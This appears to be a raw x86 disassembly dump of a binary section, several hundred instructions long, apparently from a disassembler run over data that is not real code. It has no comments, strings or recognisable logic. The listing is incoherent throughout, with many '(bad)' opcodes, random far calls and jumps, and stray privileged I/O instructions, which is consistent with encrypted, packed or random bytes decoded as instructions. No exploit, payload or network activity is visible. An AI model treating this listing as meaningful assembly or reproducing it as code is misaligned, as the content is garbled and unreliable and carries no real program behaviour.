  401fd1:	adc    BYTE PTR [ecx+0x54],bl
  401fd4:	ins    DWORD PTR es:[edi],dx
  401fd5:	fld    DWORD PTR [eax-0x39798df1]
  401fdb:	enter  0x94ef,0x33
  401fdf:	cmc    
  401fe0:	les    eax,FWORD PTR [edi-0x39efa42]
  401fe6:	xor    eax,0x9770dda
  401feb:	lods   al,BYTE PTR ds:[esi]
  401fec:	daa    
  401fed:	lods   eax,DWORD PTR ds:[esi]
  401fee:	sub    ah,ah
  401ff0:	push   ecx
  401ff1:	add    al,0x31
  401ff3:	hlt    
  401ff4:	mov    al,0x23
  401ff6:	loopne 0x40206b
  401ff8:	lds    eax,FWORD PTR [esi]
  401ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ffc:	popf   
  401ffd:	adc    BYTE PTR [ebx+0x57],dl
  402000:	stos   DWORD PTR es:[edi],eax
  402001:	adc    ebx,DWORD PTR [ebx+0x3c]
  402004:	dec    esi
  402005:	cmp    cl,bl
  402007:	pop    edi
  402008:	imul   ecx,edi,0xdb39a9d4
  40200e:	test   DWORD PTR [edx],ecx
  402010:	scas   eax,DWORD PTR es:[edi]
  402011:	mov    eax,esp
  402013:	sbb    ch,dl
  402015:	ror    BYTE PTR [eax+ebx*4],1
  402018:	or     al,0x58
  40201a:	adc    eax,0x592770b9
  40201f:	dec    esi
  402020:	and    al,0x2
  402022:	je     0x402008
  402024:	mov    ch,0x2a
  402026:	(bad)  
  402027:	popa   
  402028:	xchg   ebx,eax
  402029:	nop    DWORD PTR [ebx+0x584c63f5]
  402030:	and    BYTE PTR [edi-0x472bb291],al
  402036:	loopne 0x401fc7
  402038:	mov    dh,BYTE PTR [ebx-0x9624686]
  40203e:	lea    esp,ds:0xebb6ca13
  402044:	gs push es
  402046:	jecxz  0x401fe6
  402048:	out    dx,al
  402049:	xor    al,0x9a
  40204b:	cld    
  40204c:	fcmovu st,st(5)
  40204e:	test   eax,0x748a482
  402053:	mov    al,0x1c
  402055:	push   esp
  402056:	push   0x46
  402058:	xchg   ebp,eax
  402059:	retf   0x9db1
  40205c:	stc    
  40205d:	mov    BYTE PTR [ebp-0x19a780cf],bl
  402063:	or     BYTE PTR [esp+eax*4+0x1f934cc4],0x55
  40206b:	mov    al,ds:0x76272c70
  402070:	into   
  402071:	adc    bh,BYTE PTR [edx-0x13563780]
  402077:	int    0x59
  402079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40207a:	faddp  st(2),st
  40207c:	push   ss
  40207d:	scas   eax,DWORD PTR es:[edi]
  40207e:	mov    edi,0xbe8a73d5
  402083:	dec    esi
  402084:	hlt    
  402085:	(bad)  
  402086:	out    dx,al
  402087:	adc    DWORD PTR [edx+0x7b9f584],ebx
  40208d:	or     DWORD PTR [esi+eiz*4+0x37],ecx
  402091:	push   ebp
  402092:	stc    
  402093:	push   esp
  402094:	test   DWORD PTR ds:[ecx+0x45],0xa676a066
  40209c:	lock mov edx,0x223dbaab
  4020a2:	mov    esp,DWORD PTR [eax-0x64]
  4020a5:	push   ss
  4020a6:	ffreep st(0)
  4020a8:	jnp    0x40210b
  4020aa:	cmp    edi,DWORD PTR [ebx-0x15eef448]
  4020b0:	dec    edx
  4020b1:	mov    edi,0x3949254c
  4020b6:	sbb    ebx,edx
  4020b8:	call   0x8e0d:0xad997c89
  4020bf:	stos   BYTE PTR es:[edi],al
  4020c0:	pop    eax
  4020c1:	(bad)  
  4020c2:	adc    BYTE PTR [ebx-0x11],cl
  4020c5:	inc    esi
  4020c6:	rcr    DWORD PTR [ecx],0xad
  4020c9:	mov    edx,0xff32c62a
  4020ce:	and    DWORD PTR [esi-0x22],edi
  4020d1:	or     dl,BYTE PTR [esi]
  4020d3:	aas    
  4020d4:	pusha  
  4020d5:	cmp    al,0x1e
  4020d7:	inc    ebp
  4020d8:	mov    WORD PTR [edx],?
  4020da:	call   0x9889090a
  4020df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020e0:	inc    esi
  4020e1:	lods   eax,DWORD PTR ds:[esi]
  4020e2:	sahf   
  4020e3:	aaa    
  4020e4:	adc    ch,bh
  4020e6:	adc    cl,ah
  4020e8:	cwde   
  4020e9:	and    al,0x8
  4020eb:	push   es
  4020ec:	popa   
  4020ed:	jg     0x4020e5
  4020ef:	pop    ecx
  4020f0:	sub    ebx,DWORD PTR [edx+0x751d9a04]
  4020f6:	fst    DWORD PTR [eax+0x6f]
  4020f9:	add    DWORD PTR [edi+0x5db788d6],esi
  4020ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402100:	add    ebp,DWORD PTR [esi+0x7ddac3be]
  402106:	mov    ch,0x7e
  402108:	xlat   BYTE PTR ds:[ebx]
  402109:	or     eax,eax
  40210b:	nop
  40210c:	jecxz  0x40209a
  40210e:	inc    edx
  40210f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402110:	cmp    BYTE PTR [eax-0x670e0c19],dl
  402116:	inc    edi
  402117:	xchg   esp,eax
  402118:	(bad)  
  402119:	mov    fs,WORD PTR [edx+0x49]
  40211c:	jl     0x4020b5
  40211e:	daa    
  40211f:	jg     0x4020aa
  402121:	loope  0x40217b
  402123:	and    bl,BYTE PTR [edi-0x1854a18e]
  402129:	ret    0xa868
  40212c:	imul   ebx,DWORD PTR [eax-0x4e1946e0],0xffffffe5
  402133:	mov    bl,0xec
  402135:	bound  ecx,QWORD PTR [edi]
  402137:	add    BYTE PTR [edi-0x41f6a27a],cl
  40213d:	xor    al,BYTE PTR [ebp-0x53]
  402140:	push   eax
  402141:	dec    esp
  402142:	mul    DWORD PTR [edi+0x7e]
  402145:	or     ch,BYTE PTR [ebx]
  402147:	sub    al,0x15
  402149:	ror    bl,0x26
  40214c:	neg    BYTE PTR [edx]
  40214e:	arpl   dx,sp
  402150:	ins    DWORD PTR es:[edi],dx
  402151:	inc    ebx
  402152:	leave  
  402153:	mov    edx,0xfd282963
  402158:	sub    esi,DWORD PTR [ecx+0x6fa5999a]
  40215e:	out    0xfb,al
  402160:	push   eax
  402161:	push   ecx
  402162:	cwde   
  402163:	sbb    eax,0xcd661fcc
  402168:	mov    edx,0xe5376eea
  40216d:	(bad)  
  40216e:	jp     0x4021e9
  402170:	ins    DWORD PTR es:[edi],dx
  402171:	imul   ecx,DWORD PTR [edi-0x57],0x308c4f2d
  402178:	sub    edx,DWORD PTR [eax]
  40217a:	inc    ebp
  40217c:	pop    ss
  40217d:	ror    BYTE PTR [esi+0x9],0xfe
  402181:	sahf   
  402182:	(bad)  
  402183:	stos   DWORD PTR es:[edi],eax
  402184:	push   esi
  402185:	pop    ebp
  402186:	and    eax,0x48048dca
  40218b:	je     0x402146
  40218d:	loopne 0x40216e
  40218f:	cmp    DWORD PTR ds:0xf10c0230,0x34214569
  402199:	jle    0x40213c
  40219b:	nop
  40219c:	add    BYTE PTR [edi],ah
  40219e:	daa    
  40219f:	add    BYTE PTR [ecx],0x1d
  4021a2:	push   esp
  4021a3:	or     ch,BYTE PTR gs:[ebx-0x58]
  4021a7:	or     dh,dh
  4021a9:	ja     0x40214d
  4021ab:	mov    eax,0x15e87875
  4021b0:	inc    eax
  4021b1:	cmp    ah,BYTE PTR [edx-0x2c1b70da]
  4021b7:	push   ebp
  4021b8:	lea    esi,[ebx]
  4021ba:	in     eax,0xe5
  4021bc:	test   eax,0x311f10d5
  4021c1:	and    eax,0x3081692a
  4021c6:	add    BYTE PTR [esi],0x5c
  4021c9:	sbb    al,BYTE PTR [esi-0xf]
  4021cc:	imul   esi,ecx,0xab6bc541
  4021d2:	cmp    BYTE PTR [ebx-0x4d],bl
  4021d5:	in     al,0x65
  4021d7:	dec    ebp
  4021d8:	int    0x82
  4021da:	stc    
  4021db:	jns    0x402193
  4021dd:	push   ecx
  4021de:	mov    DWORD PTR ds:0xa595e3d9,edi
  4021e4:	push   ds
  4021e5:	retf   0xc211
  4021e8:	jecxz  0x402184
  4021ea:	sbb    esp,esp
  4021ec:	or     ebx,edx
  4021ee:	dec    ecx
  4021ef:	push   ecx
  4021f0:	xor    DWORD PTR [edx-0x4b7c31d5],esi
  4021f6:	jnp    0x402245
  4021f8:	sbb    BYTE PTR [edi+0xf],bh
  4021fb:	in     al,0x60
  4021fd:	les    esi,FWORD PTR [eax+eiz*8]
  402200:	push   esi
  402201:	mov    ds,WORD PTR [eax-0x5b]
  402204:	push   edx
  402205:	or     al,0xe3
  402207:	stos   DWORD PTR es:[edi],eax
  402208:	adc    BYTE PTR [eax],bl
  40220a:	lods   eax,DWORD PTR ds:[esi]
  40220b:	jb     0x402235
  40220d:	inc    ebp
  40220e:	adc    dh,ah
  402210:	inc    edi
  402211:	mov    ds:0xed292d2a,al
  402216:	mov    eax,0x421b3ddb
  40221b:	repnz fwait
  40221d:	loopne 0x402209
  40221f:	fild   DWORD PTR [eax+0x40530a48]
  402225:	mov    cl,0xf7
  402227:	(bad)  
  402229:	ret    
  40222a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40222b:	sahf   
  40222c:	cmc    
  40222d:	mov    edx,0x1de5bef2
  402232:	inc    eax
  402233:	ins    BYTE PTR es:[edi],dx
  402234:	pop    esi
  402235:	sbb    al,0x66
  402237:	dec    edx
  402238:	sub    edx,edi
  40223a:	push   0xf
  40223c:	pop    ebp
  40223d:	gs leave 
  40223f:	js     0x4022bd
  402241:	jl     0x4021fb
  402243:	adc    ch,dh
  402245:	sub    BYTE PTR [eax-0x77],al
  402248:	cli    
  402249:	mov    dh,0xd4
  40224b:	test   eax,0x9a23af9b
  402250:	pop    es
  402251:	in     eax,0xad
  402253:	fwait
  402254:	leave  
  402255:	(bad)  
  402256:	sub    ecx,DWORD PTR [ecx+0x23]
  402259:	mov    eax,ds:0xf6197a
  40225e:	push   edx
  40225f:	mov    WORD PTR ds:[edx+0x67],ss
  402263:	dec    edi
  402264:	push   ecx
  402265:	inc    esi
  402266:	add    eax,0xf6bcb38f
  40226b:	dec    eax
  40226c:	lahf   
  40226d:	pop    ds
  40226e:	mov    bh,0xad
  402270:	xchg   DWORD PTR [ecx],esp
  402272:	sbb    al,0x63
  402274:	arpl   sp,ax
  402276:	out    dx,eax
  402277:	imul   ebx,DWORD PTR [ecx],0xffffffe7
  40227a:	add    BYTE PTR [edi+0x74],cl
  40227d:	mov    eax,0xa311bfe4
  402282:	(bad)  
  402284:	mov    edi,0x120ec928
  402289:	out    dx,al
  40228a:	xchg   esi,eax
  40228b:	push   edi
  40228c:	int3   
  40228d:	fisttp QWORD PTR [ecx-0x3d]
  402290:	inc    ebp
  402291:	add    al,0x9e
  402293:	pop    esp
  402294:	dec    edi
  402295:	cli    
  402296:	mov    ds,WORD PTR [edx]
  402298:	dec    edi
  402299:	sub    BYTE PTR [esi],al
  40229b:	xchg   esp,eax
  40229c:	lods   eax,DWORD PTR ds:[esi]
  40229d:	aaa    
  40229e:	sub    dl,BYTE PTR [edi+0x71]
  4022a1:	or     al,0xbf
  4022a3:	out    0x89,eax
  4022a5:	push   ecx
  4022a6:	data16 mov bl,0x58
  4022a9:	jns    0x402282
  4022ab:	jmp    0x8ac4:0xad11b434
  4022b2:	cmp    dh,al
  4022b4:	into   
  4022b5:	loopne 0x402297
  4022b7:	jecxz  0x4022d2
  4022b9:	jns    0x4022bf
  4022bb:	cwde   
  4022bc:	adc    dl,ah
  4022be:	je     0x402281
  4022c0:	add    al,bh
  4022c2:	out    dx,eax
  4022c3:	loope  0x402257
  4022c5:	call   0x6520:0xf6198d
  4022cc:	(bad)  
  4022ce:	test   edx,esp
  4022d0:	sub    eax,0xcc13859d
  4022d5:	pop    edx
  4022d6:	fisttp QWORD PTR [edi+0x73]
  4022d9:	or     bl,al
  4022db:	mov    dl,0x72
  4022dd:	jl     0x4022a1
  4022df:	and    al,0xb3
  4022e1:	fdivr  DWORD PTR ds:[edx+edi*1]
  4022e5:	xchg   ebx,eax
  4022e6:	xor    al,0xd1
  4022e8:	cdq    
  4022e9:	lods   al,BYTE PTR ds:[esi]
  4022ea:	mov    bh,al
  4022ec:	sub    esp,DWORD PTR [ecx]
  4022ee:	(bad)  
  4022ef:	cld    
  4022f0:	or     eax,0xbde359cb
  4022f5:	jo     0x4022a5
  4022f7:	repnz sahf 
  4022f9:	dec    edx
  4022fa:	jae    0x402339
  4022fc:	sub    ch,dh
  4022fe:	sbb    ebp,DWORD PTR [ebx-0x33]
  402301:	mov    al,ds:0xa9983fc9
  402306:	dec    esp
  402307:	push   ebx
  402308:	xor    dl,bh
  40230a:	fadd   DWORD PTR [esi]
  40230c:	push   ecx
  40230d:	js     0x40237d
  40230f:	xchg   esi,eax
  402310:	mov    edi,0x84c999f1
  402315:	std    
  402316:	xor    eax,0xb390feb0
  40231b:	cmp    eax,0x2504b53a
  402320:	mov    bl,0xcb
  402322:	ror    DWORD PTR [esi-0x4f],0x7f
  402326:	jp     0x402399
  402328:	in     al,0xaf
  40232a:	loopne 0x40238a
  40232c:	inc    edx
  40232d:	push   edx
  40232e:	mov    ?,WORD PTR ds:[eax]
  402331:	mov    edi,0x1cd78ee9
  402336:	and    dh,BYTE PTR [ecx]
  402338:	gs jne 0x40237a
  40233b:	mov    esp,0xaf98823a
  402340:	and    eax,0xc7db15e2
  402345:	adc    eax,0xdf3a0ba8
  40234a:	call   0x64dc:0x1cb42434
  402351:	xchg   esp,eax
  402352:	fild   DWORD PTR [esi+0x5cbe4af4]
  402358:	pop    edi
  402359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40235a:	imul   edi,esp,0xffffffca
  40235d:	sub    esp,DWORD PTR [ebp-0x7deed5c6]
  402363:	dec    edx
  402364:	mov    BYTE PTR [ebx-0x25727048],dh
  40236a:	sub    eax,0xeec298e6
  40236f:	shr    cl,cl
  402371:	dec    ebx
  402372:	mov    bl,0x4d
  402374:	or     bl,BYTE PTR [ebp-0x50]
  402377:	dec    ecx
  402378:	lock push ss
  40237a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40237b:	dec    edi
  40237c:	sub    DWORD PTR [edi],0xfa5eca60
  402382:	(bad)  
  402383:	das    
  402384:	ins    BYTE PTR es:[edi],dx
  402385:	push   esi
  402386:	xor    BYTE PTR [esi+0x55532494],dh
  40238c:	xchg   esp,eax
  40238d:	xchg   ecx,eax
  40238e:	(bad)  
  402390:	adc    cl,dh
  402392:	xchg   esi,eax
  402393:	and    eax,0x8a8b9859
  402398:	addr16 call 0xc9744737
  40239e:	lea    ecx,[eax-0x24]
  4023a1:	out    dx,eax
  4023a2:	rol    BYTE PTR [ebp-0x24],0xff
  4023a6:	add    DWORD PTR [ebx],esi
  4023a8:	(bad)  
  4023a9:	popa   
  4023aa:	inc    edi
  4023ab:	push   ebp
  4023ac:	fistp  DWORD PTR [edx+0x109f30a7]
  4023b2:	push   esp
  4023b3:	cs mov cl,0x25
  4023b6:	mov    WORD PTR [eax-0x44],fs
  4023b9:	mov    ds:0x917a606c,eax
  4023be:	sti    
  4023bf:	data16 xchg BYTE PTR [eax-0x40ec29b0],cl
  4023c6:	pop    esi
  4023c7:	das    
  4023c8:	cmp    eax,ebx
  4023ca:	add    esp,DWORD PTR [ecx+eiz*2-0x3ca48683]
  4023d1:	or     ecx,esi
  4023d3:	arpl   WORD PTR [eax-0x4a],dx
  4023d6:	fdivr  QWORD PTR [ebx]
  4023d8:	int3   
  4023d9:	sbb    ebx,esp
  4023db:	jb     0x402427
  4023dd:	ja     0x4023ce
  4023df:	cwde   
  4023e0:	ds jmp 0x8266:0x76b08da9
  4023e8:	xchg   esp,eax
  4023e9:	and    eax,0x428a2664
  4023ee:	cli    
  4023ef:	fwait
  4023f0:	xchg   edi,eax
  4023f1:	push   esp
  4023f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023f3:	cdq    
  4023f4:	or     DWORD PTR [ebx-0x7a],ebx
  4023f7:	push   ecx
  4023f8:	push   ss
  4023f9:	and    DWORD PTR [edx+0x7a23e052],esp
  4023ff:	pop    esp
  402400:	and    DWORD PTR [ebx+0x2cb16306],eax
  402406:	or     DWORD PTR [edx-0x72],0xffffff90
  40240a:	into   
  40240b:	dec    eax
  40240c:	sbb    dh,cl
  40240e:	and    edx,DWORD PTR [eax+0x35]
  402411:	jo     0x402453
  402413:	ins    DWORD PTR es:[edi],dx
  402414:	mov    si,0xa86d
  402418:	clc    
  402419:	or     bl,BYTE PTR [eax-0x7ae4fe3d]
  40241f:	add    al,0x1c
  402421:	loope  0x402410
  402423:	shl    BYTE PTR [esp+edx*1],1
  402426:	pop    esp
  402427:	sub    al,0x4b
  402429:	fld    DWORD PTR [edi-0x2dfa4e96]
  40242f:	pop    ebx
  402430:	hlt    
  402431:	dec    esp
  402432:	add    al,0xaa
  402434:	xchg   ebp,eax
  402435:	ins    BYTE PTR es:[edi],dx
  402436:	xchg   ecx,eax
  402437:	out    0x2c,eax
  402439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40243a:	aam    0x4a
  40243c:	mov    dh,0x32
  40243e:	mov    DWORD PTR [ecx+ebx*2+0x621668bb],ebp
  402445:	sbb    DWORD PTR [ebx],eax
  402447:	sub    al,0xf7
  402449:	sub    esp,DWORD PTR [ecx-0x1d8f818]
  40244f:	pusha  
  402450:	fwait
  402451:	push   0xe0ae8692
  402456:	inc    ebp
  402457:	jle    0x40245b
  402459:	data16 and dl,BYTE PTR [ebp+0x2ddb195c]
  402460:	or     DWORD PTR [edi-0x28],eax
  402463:	into   
  402464:	xchg   BYTE PTR [edi-0x2f46808f],ch
  40246a:	xor    BYTE PTR [esi+0x755225ee],ah
  402470:	jno    0x402493
  402472:	test   BYTE PTR [ecx+eax*4-0x66431971],bh
  402479:	retw   
  40247b:	add    DWORD PTR [esi-0x5f],ebp
  40247e:	push   DWORD PTR [esi]
  402480:	push   DWORD PTR [ebp-0x18e3a32e]
  402486:	repz (bad) 
  402488:	out    dx,al
  402489:	mov    ds:0x44e868a4,eax
  40248e:	sti    
  40248f:	jnp    0x402438
  402491:	cmp    eax,DWORD PTR [edx-0xe]
  402494:	jge    0x402487
  402496:	pop    edx
  402497:	mov    ch,BYTE PTR [ecx+0x44]
  40249a:	add    eax,0x2c5dd7ea
  40249f:	ds stc 
  4024a1:	shr    DWORD PTR [eax-0x76],cl
  4024a4:	imul   ebp,ebx,0x4c
  4024a7:	add    al,0xa8
  4024a9:	push   esp
  4024aa:	mov    dl,0xc8
  4024ac:	xlat   BYTE PTR ds:[ebx]
  4024ad:	adc    eax,0x6762f938
  4024b2:	(bad)  
  4024b3:	jecxz  0x4024ba
  4024b5:	mov    esi,0x88099589
  4024ba:	inc    esp
  4024bb:	daa    
  4024bc:	fstp   st(5)
  4024be:	std    
  4024bf:	sbb    al,0x1e
  4024c1:	mov    ebp,eax
  4024c3:	aad    0xbe
  4024c5:	sar    DWORD PTR [edx+0x7],1
  4024c8:	repnz test DWORD PTR [ebx+ebp*4-0x39bc55be],edi
  4024d0:	inc    edi
  4024d1:	int    0x80
  4024d3:	xor    eax,0xc7e51487
  4024d8:	sbb    eax,0xe1890f2b
  4024dd:	outs   dx,DWORD PTR ds:[esi]
  4024de:	or     eax,0xfdc5d6ce
  4024e3:	sbb    al,0x3b
  4024e5:	shl    al,cl
  4024e7:	pop    ebx
  4024e8:	jl     0x402479
  4024ea:	fdiv   DWORD PTR [edx-0x38fa48c3]
  4024f0:	fisub  WORD PTR [edi]
  4024f2:	rcl    BYTE PTR [edx],cl
  4024f4:	cwde   
  4024f5:	rol    DWORD PTR [edi+0x6d],0xab
  4024f9:	mov    eax,ds:0xba7fe7b0
  4024fe:	dec    esi
  4024ff:	jge    0x4024a4
  402501:	ins    DWORD PTR es:[edi],dx
  402502:	call   DWORD PTR [ecx+eax*1+0x16]
  402506:	icebp  
  402507:	pop    ebp
  402508:	push   eax
  402509:	xor    cl,BYTE PTR [edx]
  40250b:	bound  esi,QWORD PTR [ecx+0x313ea8ad]
  402511:	xor    bh,BYTE PTR [ebx+edx*4+0x27]
  402515:	cwde   
  402516:	imul   edi,DWORD PTR [edi-0x644d2783],0x32bb77d
  402520:	ja     0x4024a4
  402522:	ror    DWORD PTR [edi],cl
  402524:	fmulp  st(0),st
  402526:	out    0xc2,al
  402528:	dec    ebx
  402529:	jmp    0xb907:0x980719f1
  402530:	jb     0x40253e
  402532:	lock enter 0x180,0xfb
  402537:	xor    edx,DWORD PTR [ecx-0x1c]
  40253a:	fcomp  DWORD PTR [eax]
  40253c:	test   DWORD PTR [esi+0x6f],esi
  40253f:	test   cl,ch
  402541:	sahf   
  402542:	xchg   ebx,eax
  402543:	and    BYTE PTR [edx+0x51],ah
  402546:	imul   DWORD PTR [edi+0x792e6168]
  40254c:	mov    ah,0x5e
  40254e:	outs   dx,BYTE PTR ds:[esi]
  40254f:	dec    BYTE PTR ds:0xd66fc54a
  402555:	or     BYTE PTR [edx+0x4c],bl
  402558:	sbb    eax,DWORD PTR [edx+0x27]
  40255b:	cmc    
  40255c:	(bad)  
  40255d:	aas    
  40255e:	leave  
  40255f:	sar    BYTE PTR [edx-0x534c9ebb],1
  402565:	mov    dl,0xc1
  402567:	cmc    
  402568:	in     eax,0x3
  40256a:	jmp    0xc43aee49
  40256f:	mov    al,0x83
  402571:	or     edx,DWORD PTR [edx+0x2c]
  402574:	xor    eax,0x9641b505
  40257a:	rol    BYTE PTR [ecx-0x35d62484],1
  402580:	mov    al,0x8e
  402582:	sub    BYTE PTR ds:0x91c20bfe,dl
  402588:	pop    ebp
  402589:	lds    sp,DWORD PTR [ecx+esi*2]
  40258d:	adc    dh,ch
  40258f:	add    al,0x99
  402591:	push   ds
  402592:	xor    eax,DWORD PTR [ebx+ebp*4-0x475653dc]
  402599:	nop
  40259a:	add    ebx,DWORD PTR [edi+ecx*4]
  40259d:	sub    ebp,ecx
  40259f:	sbb    al,0x8c
  4025a1:	call   0x111cee6d
  4025a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a7:	xchg   BYTE PTR [edi],ch
  4025a9:	add    cl,bl
  4025ab:	xor    al,0xec
  4025ad:	mov    bl,0x41
  4025af:	(bad)  
  4025b0:	xor    DWORD PTR [esi],ebp
  4025b2:	jae    0x4025ef
  4025b4:	in     eax,0x4
  4025b6:	push   0xbfdbf60b
  4025bb:	jnp    0x40253e
  4025bd:	adc    ebp,ecx
  4025bf:	mov    eax,?
  4025c1:	(bad)  
  4025c2:	jne    0x402613
  4025c4:	enter  0xdfec,0xcf
  4025c8:	xchg   ecx,eax
  4025c9:	not    DWORD PTR ds:0x12ecf9cf
  4025cf:	and    DWORD PTR [eax+0x46e5a3ea],esp
  4025d5:	xor    DWORD PTR [ebx-0x53],esi
  4025d8:	adc    eax,0xe3677fe7
  4025dd:	push   edx
  4025de:	adc    eax,0xaac6474
  4025e3:	adc    DWORD PTR [edx-0x3e300522],ecx
  4025e9:	add    DWORD PTR [edx+eiz*2],0x7b
  4025ed:	sub    BYTE PTR [edx+0x32e5d950],bl
  4025f3:	retf   0x554f
  4025f6:	xor    eax,0xdc2a4952
  4025fb:	jg     0x40265f
  4025fd:	cmp    BYTE PTR [esi-0x1e7c4372],0xfc
  402604:	cwde   
  402605:	lds    esp,FWORD PTR [esi+0x46538af3]
  40260b:	(bad)  
  40260c:	loopne 0x402618
  40260e:	cmp    ah,BYTE PTR ds:0x8a4ed029
  402614:	lods   al,BYTE PTR ds:[esi]
  402615:	ja     0x402647
  402617:	pop    ebp
  402618:	aad    0xd9
  40261a:	call   0xfd173001
  40261f:	pop    edx
  402620:	mov    dh,0x2a
  402622:	mov    esi,0xde0528ef
  402627:	lock xchg ecx,eax
  402629:	cmp    ebx,DWORD PTR [ebx+eax*1+0x1a]
  40262d:	sub    DWORD PTR [edi+0x32],ebp
  402630:	rcl    BYTE PTR [ebx],1
  402632:	retf   0xdbd2
  402635:	mov    al,ds:0x64b70248
  40263a:	test   DWORD PTR [esi-0x12],0xd5661242
  402641:	adc    al,0x3b
  402643:	sbb    eax,0xaa8c9d59
  402648:	xchg   ebx,eax
  402649:	sbb    bh,BYTE PTR [esi-0x21]
  40264c:	xchg   ebx,eax
  40264d:	in     eax,dx
  40264e:	imul   edx,DWORD PTR ds:[edi-0x509f2354],0xfffffff7
  402656:	test   DWORD PTR [esi+0x7c677],eax
  40265c:	lds    edx,FWORD PTR [eax-0x4f]
  40265f:	xor    cl,BYTE PTR [edx+0x7b1e4fae]
  402665:	pop    esi
  402666:	inc    ebp
  402667:	adc    BYTE PTR [esi+0x51ad02e7],ch
  40266d:	stc    
  40266e:	mov    ch,BYTE PTR [ecx+0x49fead61]
  402674:	push   eax
  402675:	aad    0xb9
  402677:	inc    ecx
  402678:	dec    ebx
  402679:	or     esi,DWORD PTR [esi]
  40267b:	adc    DWORD PTR [edx],ebx
  40267d:	lods   al,BYTE PTR ds:[esi]
  40267e:	inc    ebp
  40267f:	jae    0x402648
  402681:	sbb    BYTE PTR [ebp-0x4a],al
  402684:	push   ds
  402685:	push   0xffffff8b
  402687:	hlt    
  402688:	imul   ebp,esi,0xffffffb4
  40268b:	stos   DWORD PTR es:[edi],eax
  40268c:	and    eax,0x53eac565
  402691:	inc    esi
  402692:	add    DWORD PTR [edi+0x5d],esi
  402695:	jmp    0x9da5:0x7430609e
  40269c:	jae    0x4026e6
  40269e:	mov    bh,0xd4
  4026a0:	add    ah,BYTE PTR ds:0xe59f0989
  4026a6:	sbb    ebp,DWORD PTR [ebx]
  4026a8:	mov    esp,0xd52e1e8c
  4026ad:	adc    al,BYTE PTR [ebx-0x5c9c5ba7]
  4026b3:	in     eax,0x22
  4026b5:	retf   
  4026b6:	or     eax,0x154a557d
  4026bb:	retf   
  4026bc:	xchg   ebx,eax
  4026bd:	scas   eax,DWORD PTR es:[edi]
  4026be:	ror    DWORD PTR ds:0x5bf6f61d,0xf6
  4026c5:	xchg   ebx,eax
  4026c6:	xor    eax,esi
  4026c8:	(bad)  
  4026c9:	fadd   DWORD PTR [esi-0x15]
  4026cc:	ja     0x402726
  4026ce:	xlat   BYTE PTR ds:[ebx]
  4026cf:	push   esp
  4026d0:	push   es
  4026d1:	xchg   esp,eax
  4026d2:	scas   al,BYTE PTR es:[edi]
  4026d3:	cmc    
  4026d4:	mov    cl,0x1a
  4026d6:	jbe    0x402747
  4026d8:	data16 jo 0x4026c9
  4026db:	call   0x84f8b2ba
  4026e0:	adc    edi,DWORD PTR [ebp+esi*1+0x7309dfc6]
  4026e7:	shl    BYTE PTR [edx+0x39],cl
  4026ea:	clc    
  4026eb:	dec    eax
  4026ec:	xchg   edi,eax
  4026ed:	fst    DWORD PTR [eax-0x1cc57394]
  4026f3:	ins    DWORD PTR es:[edi],dx
  4026f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026f5:	out    dx,eax
  4026f6:	test   BYTE PTR [ebp-0x3021515d],0xa1
  4026fd:	xchg   edx,eax
  4026fe:	push   eax
  4026ff:	(bad)  [ebx-0x350b0f8f]
  402705:	aam    0x2e
  402707:	inc    ebx
  402708:	ror    ebp,0x60
  40270b:	sub    eax,eax
  40270d:	sbb    bh,dl
  40270f:	call   0x37e1:0x69271c75
  402716:	in     eax,0x7a
  402718:	mov    al,0x18
  40271a:	cmp    BYTE PTR [edx-0x533ea054],dl
  402720:	pop    edi
  402721:	mov    al,ds:0xb2d02c8b
  402726:	xor    al,0xd1
  402728:	mov    dh,0xa4
  40272a:	mov    ch,0x4d
  40272c:	iret   
  40272d:	loopne 0x40279b
  40272f:	cld    
  402730:	retf   
  402731:	mov    al,ds:0xbd132df7
  402736:	or     BYTE PTR [eax-0x3ccfeafc],ah
  40273c:	or     al,0xbe
  40273e:	arpl   WORD PTR [ecx],bx
  402740:	jecxz  0x40270c
  402742:	outs   dx,BYTE PTR ds:[esi]
  402743:	in     al,dx
  402744:	loope  0x402780
  402746:	setns  BYTE PTR [eax+0x5a]
  40274a:	mov    ch,BYTE PTR [edi-0x78]
  40274d:	(bad)  
  40274e:	test   eax,0xa1ac8f84
  402753:	or     eax,0xa33a6a76
  402758:	xor    eax,DWORD PTR [ecx-0x4ab0bdfb]
  40275e:	es das 
  402760:	jae    0x402741
  402762:	jle    0x4026ef
  402764:	repnz and BYTE PTR [ebp-0x8],dl
  402768:	outs   dx,DWORD PTR ds:[esi]
  402769:	fwait
  40276a:	lds    esp,FWORD PTR [esi]
  40276c:	and    eax,0x621d5576
  402771:	sahf   
  402772:	out    0x8f,al
  402774:	aad    0x97
  402776:	maxps  xmm6,XMMWORD PTR [eax-0x1c]
  40277a:	hlt    
  40277b:	jecxz  0x402767
  40277d:	aam    0xe2
  40277f:	jg     0x402730
  402781:	loope  0x40270d
  402783:	or     ebp,DWORD PTR [esi+0x48]
  402786:	inc    edi
  402787:	imul   ebx,DWORD PTR [ebp-0x5],0x2c
  40278b:	leave  
  40278c:	sahf   
  40278d:	aaa    
  40278e:	dec    esp
  40278f:	add    ch,BYTE PTR [si-0xe]
  402793:	outs   dx,BYTE PTR ds:[esi]
  402794:	mov    eax,esi
  402796:	add    edi,ebx
  402798:	imul   esi,ebx,0x32
  40279b:	mov    eax,ds:0x4ec70866
  4027a0:	shr    BYTE PTR [edx+0x46],1
  4027a3:	mov    ds:0xbc7fa04f,eax
  4027a8:	mov    eax,ds:0x1f8f45b3
  4027ad:	adc    eax,0x3587b0a0
  4027b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b3:	cld    
  4027b4:	lods   eax,DWORD PTR ds:[esi]
  4027b5:	int3   
  4027b6:	int    0xfd
  4027b8:	push   es
  4027b9:	in     eax,dx
